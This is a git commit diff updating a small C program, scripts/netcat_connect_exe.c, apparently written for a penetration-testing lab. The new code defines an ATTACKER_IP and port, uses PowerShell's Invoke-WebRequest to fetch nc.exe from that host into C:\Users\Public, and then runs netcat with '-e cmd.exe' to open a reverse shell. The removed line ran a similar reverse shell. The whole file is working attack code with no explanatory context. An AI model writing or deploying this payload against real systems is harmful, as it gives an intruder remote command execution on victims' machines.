8028232e1f8c1b68ba423a3e6ed981230b935f0b
violin-ing <eugenekhy@gmail.com>
2025-04-23 05:44:35 -0400

    updated netcat script

--- scripts/netcat_connect_exe.c
+++ scripts/netcat_connect_exe.c
@@ -1,6 +1,25 @@
-# include <stdlib.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+#define ATTACKER_IP "192.168.45.152"
+#define ATTACKER_PORT "443"
 
 int main(void) {
-	system("C:\\Users\\Public\\nc.exe 192.168.45.166 4444 -e cmd.exe");
-	return 0;
+    char downloadCmd[512];
+    char reverseShellCmd[512];
+
+    // Build the download command using PowerShell's Invoke-WebRequest
+    snprintf(downloadCmd, sizeof(downloadCmd),
+        "if not exist C:\\Users\\Public\\nc.exe powershell -Command \"iwr -Uri http://%s/nc.exe -OutFile C:\\Users\\Public\\nc.exe\"",
+        ATTACKER_IP);
+    system(downloadCmd);
+
+    // Build the reverse shell command using netcat
+    snprintf(reverseShellCmd, sizeof(reverseShellCmd),
+        "C:\\Users\\Public\\nc.exe %s %s -e cmd.exe",
+        ATTACKER_IP, ATTACKER_PORT);
+    system(reverseShellCmd);
+
+    return 0;
 }
+
